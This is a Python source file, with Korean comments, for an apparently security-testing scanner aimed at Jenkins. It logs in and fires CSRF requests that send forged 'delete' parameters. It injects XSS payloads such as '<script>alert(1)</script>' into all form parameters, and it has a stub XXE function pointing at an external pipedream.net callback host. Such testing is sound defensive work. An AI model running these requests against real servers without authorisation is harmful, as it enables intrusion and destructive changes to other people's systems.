from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.select import Select
import pandas as pd
import requests as req
from src.func import *
from tqdm import tqdm


#@ Jenkins에서
def xxe_on_build_after_option(chrome, url, port, path, response_server="https://eozqaulxtdlixhg.m.pipedream.net/xxe"):
    target = f"http://{url}:{port}/{path}"
    chrome.get(target)



def Csrf_protection_check(chrome, url, port, id, pw, path, action, value, value_type):
    try:
        uri = f"http://{url}:{port}{path}"
        chrome.get(uri)
        print("접속 시도")
        login(chrome,id,pw,"not first")
        sleep(1)
    except:
        print("접속중.....")

    try:
        info = []
        with open("user_info.txt", "r") as user:
            info = user.readlines()

    except:
        print("유저 에이전트 정보를 위한 파일이 필요합니다. user_info.txt를 생성하고 구글에 my user agent를 쳐서 나온 값을 파일에 넣어 주세요")

    user_agent = info[0]

    #EXPLOIT!
    if value=="input":
        if "name" in value_type:
            key= value_type[6:]
            value = "delete"

    else:
        key, value = "submit", "wawawawawawa"

    not_valid_key = ['Jenkins-Crumb']

    if key not in not_valid_key:
    #세션을 가져옴
        session = get_session(chrome, user_agent)
        payload = action
        if "http" not in payload:
            payload = uri+payload
        exploit_data = {key:value}

        #파라미터 날려보고 response 받음, 근데 delete같이 페이지를 삭제하면 404떠서 dummy값 날림
        response = session.get(payload+'/', params=exploit_data)
        sleep(1)

        return key, value, response

    else:
        print("Skip")
        return 0,0,0

def xss_sidevar_point():
    #@todo 소연이가 만든거 붙이기
    print("will be mearge")


def xss_reflected_all_param(url, port,id, pw, vm_num):
    #일단 로그인해서 세션 생성
    url = f"http://{url}:{port}"

    cheatsheet = [
        "<img src='x' onerror='alert(1)'",
        "<script>alert(1)</script>"
    ]
    allow_response = [
        200,
        302
    ]

    ignore_param_list = [
        'Jenkins-Crumb',
        'json'
    ]
    with open("./user_info.txt") as u_info:
        user_agent = u_info.readlines()[0]

    session = req.session()
    headers = {
        "User-Agent" : user_agent
    }
    session.headers.update(headers)
    session.get(url+"/login?from=%2F")
    login_data = {
        "j_username": id,
        "j_password": pw,
        "from" : "/",
        "Submit" : ""
    }
    session.post(url+"/j_spring_security_check", data = login_data)

    file_name = f"Scanning_all_param_result_vm{vm_num}_{id}.csv"
    csv_data = pd.read_csv(f"./csv/{file_name}")
    csv_data_len = len(csv_data.index)
    print("csv_Data" ,csv_data_len)

    #공격에 사용될 데이터 가공
    param_dict = {}
    result_file_row = []



    Frame = csv_data.loc
    for i in tqdm(range(csv_data_len),mininterval=1):

        Action = Frame[i]['Action']
        param_dict[Frame[i]['Parameter']] = Frame[i]['Value']
        #{param : value}

        #Action이 바뀌었을 경우
        if i+1 == csv_data_len or Action != Frame[i+1]['Action']:
            # [param1, param2.....] It will be used keys
            param_list = csv_data[csv_data['Action'] == Action]['Parameter'].to_list()
            print(param_list)


            for i in range(len(param_list)):
                tmp_data = param_dict[param_list[i]]

                for sheet in cheatsheet:
                    param_dict[param_list[i]] = sheet
                    payload = f"{Action}/?"

                    for j in range(len(param_list)):
                        print(param_dict[param_list[j]])
                        if param_dict[param_list[j]] == 'NaN':
                            param_dict[param_list[j]] = ''

                        if j<len(param_list)-1:
                            payload+=f"{param_list[j]}={param_dict[param_list[j]]}&"
                        else:
                            payload += f"{param_list[j]}={param_dict[param_list[j]]}"

                    res = session.get(payload)
                    if res.status_code in allow_response:
                        if sheet in res.text:
                            result_file_row.append([url, id, Action, payload, sheet])
                param_dict[param_list[i]] = tmp_data

            #파라미터 초기화
            param_dict = {}

    #결과물 출력
    return result_file_row
